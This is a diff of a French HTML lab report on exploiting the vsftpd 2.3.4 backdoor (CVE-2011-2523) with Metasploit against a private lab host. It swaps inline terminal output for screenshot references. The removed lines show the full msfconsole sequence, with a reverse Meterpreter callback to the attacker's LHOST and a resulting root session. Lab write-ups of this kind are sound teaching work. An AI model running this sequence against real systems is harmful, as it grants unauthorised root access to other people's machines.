@@ -32,55 +32,30 @@
   <figure class="capture" id="cap-recon">
     <img src="../images/vsftpd/01-recon-nmap.png" alt="Résultat du scan nmap sur le port 21">
     <figcaption>
-      <strong class="idx">1.</strong>
+      <strong class="idx">a.</strong>
       <span class="desc">Résultat de <code>nmap -sV -p 21 172.28.128.5</code> : le service est
       identifié comme <code>vsftpd 2.3.4</code>, version connue pour contenir une porte
       dérobée.</span>
-      <span class="fname">images/vsftpd/01-recon-nmap.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">2. Méthode d'identification de la CVE et du module</h2>
   <p>À partir de la version exacte obtenue en reconnaissance (<code>vsftpd 2.3.4</code>),
-  première question indépendante de tout outil : cette version a-t-elle une faille connue ?</p>
+  première question indépendante de tout outil : cette version a-t-elle une faille connue ?
+  <code>searchsploit vsftpd 2.3.4</code> confirme qu'un exploit existe, mais ne donne ni CVE
+  ni chemin de module Metasploit directement utilisable (capture b ci-dessous).</p>
 
-  <pre class="terminal">$ searchsploit vsftpd 2.3.4
+  <p>Étape suivante : chercher <strong>dans <code>msfconsole</code></strong> puisque c'est
+  l'outil choisi pour l'exploitation — <code>search vsftpd</code> donne deux résultats, mais
+  un seul correspond à la version 2.3.4 précise identifiée en reconnaissance
+  (<code>vsftpd_232</code> vise une version antérieure, un simple déni de service).
+  <strong>C'est de là que vient le chemin exact
+  <code>exploit/unix/ftp/vsftpd_234_backdoor</code></strong> (même capture b).</p>
 
----------------------------------------------- ---------------------------------
- Exploit Title                                |  Path
----------------------------------------------- ---------------------------------
-vsftpd 2.3.4 - Backdoor Command Execution      | unix/remote/49757.py
-vsftpd 2.3.4 - Backdoor Command Execution (Me  | unix/remote/17491.rb
----------------------------------------------- ---------------------------------</pre>
-
-  <p>Confirmé — un exploit existe. <code>searchsploit</code> ne donne ni la CVE ni un chemin
-  de module Metasploit directement utilisable, donc étape suivante : chercher
-  <strong>dans <code>msfconsole</code></strong> puisque c'est l'outil choisi pour
-  l'exploitation :</p>
-
-  <pre class="terminal">$ msfconsole -q -x "search vsftpd; exit"
-
-#  Full Name                             Disclosure Date  Rank       Check  Name
--  ---------                             ---------------  ----       -----  ----
-0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 and Earlier STAT Denial of Service
-1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution</pre>
-
-  <p><strong>C'est de là que vient le chemin exact
-  <code>exploit/unix/ftp/vsftpd_234_backdoor</code></strong> — deux résultats remontent pour
-  "vsftpd", mais un seul correspond à la version 2.3.4 précise identifiée en reconnaissance
-  (<code>vsftpd_232</code> vise une version antérieure et différente, un simple déni de
-  service). Reste à obtenir la CVE elle-même, absente des deux résultats précédents :</p>
-
-  <pre class="terminal">$ msfconsole -q -x "info exploit/unix/ftp/vsftpd_234_backdoor; exit"
-
-References:
-  https://nvd.nist.gov/vuln/detail/CVE-2011-2523
-  OSVDB (73573)
-  http://pastebin.com/AetT9sS5
-  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html</pre>
-
-  <p>La section <code>References</code> de la sortie confirme <strong>CVE-2011-2523</strong>.
-  En recoupant avec les liens fournis, on comprend la nature exacte de la faille : entre le
+  <p>Reste à obtenir la CVE elle-même, absente des deux résultats précédents :
+  <code>info</code> sur le module donne, dans sa section <code>References</code>,
+  <strong>CVE-2011-2523</strong> (capture c). En recoupant avec les liens fournis, on
+  comprend la nature exacte de la faille : entre le
   30 juin et le 3 juillet 2011, l'archive source officielle de vsftpd 2.3.4 a été remplacée
   par une version trafiquée directement sur le serveur de téléchargement du mainteneur — une
   compromission de la <strong>chaîne de distribution logicielle</strong> (supply chain), et
@@ -97,93 +72,67 @@ References:
   <figure class="capture" id="cap-recherche">
     <img src="../images/vsftpd/02-recherche-module.png" alt="Résultat de searchsploit puis search vsftpd dans msfconsole">
     <figcaption>
-      <strong class="idx">2.</strong>
+      <strong class="idx">b.</strong>
       <span class="desc">Les deux recherches à la suite : <code>searchsploit vsftpd 2.3.4</code>
       confirme qu'un exploit connu existe, puis <code>search vsftpd</code> dans
       <code>msfconsole</code> donne le chemin exact du module
       (<code>exploit/unix/ftp/vsftpd_234_backdoor</code>), distinct de l'autre résultat qui
       vise une version différente.</span>
-      <span class="fname">images/vsftpd/02-recherche-module.png</span>
     </figcaption>
   </figure>
 
   <figure class="capture" id="cap-info-cve">
     <img src="../images/vsftpd/03-info-cve.png" alt="Résultat de info sur le module, section References">
     <figcaption>
-      <strong class="idx">3.</strong>
+      <strong class="idx">c.</strong>
       <span class="desc">Résultat de <code>info</code> sur le module : la section
       <code>References</code> donne <strong>CVE-2011-2523</strong>.</span>
-      <span class="fname">images/vsftpd/03-info-cve.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">3. Démarche d'exploitation</h2>
   <p>Le module Metasploit dédié existant déjà (<code>exploit/unix/ftp/vsftpd_234_backdoor</code>),
   aucune recherche d'exploit supplémentaire n'était nécessaire. Démarche interactive dans
-  <code>msfconsole</code>, commande par commande :</p>
-
-  <pre class="terminal">msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.28.128.5
-RHOSTS => 172.28.128.5
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21
-RPORT => 21
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 172.28.128.1
-LHOST => 172.28.128.1</pre>
-
-  <p><strong class="field">Point d'attention —</strong> le réglage de <code>LHOST</code> est
-  obligatoire : le payload par défaut de ce module (<code>cmd/linux/http/x86/meterpreter_reverse_tcp</code>)
-  établit une connexion retour vers l'attaquant et a donc besoin de savoir où se connecter.
-  Sans <code>LHOST</code>, l'exploitation échoue avec une erreur de validation d'option.</p>
+  <code>msfconsole</code>, commande par commande : <code>use</code> du module puis
+  <code>set RHOSTS</code> / <code>set RPORT</code> / <code>set LHOST</code> (capture d).
+  <strong class="field">Point d'attention —</strong> <code>LHOST</code> est obligatoire ici
+  car le payload par défaut du module est un reverse Meterpreter, qui doit savoir où
+  rappeler.</p>
 
   <figure class="capture" id="cap-config">
     <img src="../images/vsftpd/04-exploit-config.png" alt="Configuration du module avant lancement">
     <figcaption>
-      <strong class="idx">4.</strong>
+      <strong class="idx">d.</strong>
       <span class="desc">Chargement du module et configuration des options
       (<code>RHOSTS</code>, <code>RPORT</code>, <code>LHOST</code>) — avant le déclenchement
       de l'exploit lui-même.</span>
-      <span class="fname">images/vsftpd/04-exploit-config.png</span>
     </figcaption>
   </figure>
 
   <p>Une fois la configuration validée, <code>exploit -z</code> déclenche l'attaque (le
   <code>-z</code> bascule la session en arrière-plan dès son ouverture, sans y entrer
-  automatiquement) :</p>
-
-  <pre class="terminal">msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit -z
-[*] Started reverse TCP handler on 172.28.128.1:4444
-[*] 172.28.128.5:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
-[+] 172.28.128.5:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected
-[+] 172.28.128.5:21 - Backdoor has been spawned!
-[*] Meterpreter session 1 opened (172.28.128.1:4444 -> 172.28.128.5:35322)
-[*] Session 1 created in the background.</pre>
+  automatiquement).</p>
 
   <figure class="capture" id="cap-launch">
     <img src="../images/vsftpd/05-exploit-launch.png" alt="Déclenchement de exploit -z et ouverture de la session">
     <figcaption>
-      <strong class="idx">5.</strong>
+      <strong class="idx">e.</strong>
       <span class="desc"><code>exploit -z</code> en action : le module confirme la
       vulnérabilité de la bannière FTP, déclenche la backdoor
       (<code>Backdoor has been spawned!</code>), et ouvre une session Meterpreter.</span>
-      <span class="fname">images/vsftpd/05-exploit-launch.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">4. Preuve d'accès obtenu</h2>
   <p>La commande <code>sessions -i 1 -c id</code> exécute <code>id</code> directement dans la
-  session ouverte, sans y entrer en mode interactif :</p>
-
-  <pre class="terminal">msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c id
-[*] Running 'id' on meterpreter session 1 (172.28.128.5)
-uid=0(root) gid=0(root)</pre>
+  session ouverte, sans y entrer en mode interactif.</p>
 
   <figure class="capture" id="cap-preuve">
     <img src="../images/vsftpd/06-session-root.png" alt="Session Meterpreter root confirmée">
     <figcaption>
-      <strong class="idx">6.</strong>
+      <strong class="idx">f.</strong>
       <span class="desc">Sortie de <code>sessions -i 1 -c id</code> confirmant l'accès root
       complet (<code>uid=0(root) gid=0(root)</code>) sur <code>172.28.128.5</code>.</span>
-      <span class="fname">images/vsftpd/06-session-root.png</span>
     </figcaption>
   </figure>
 
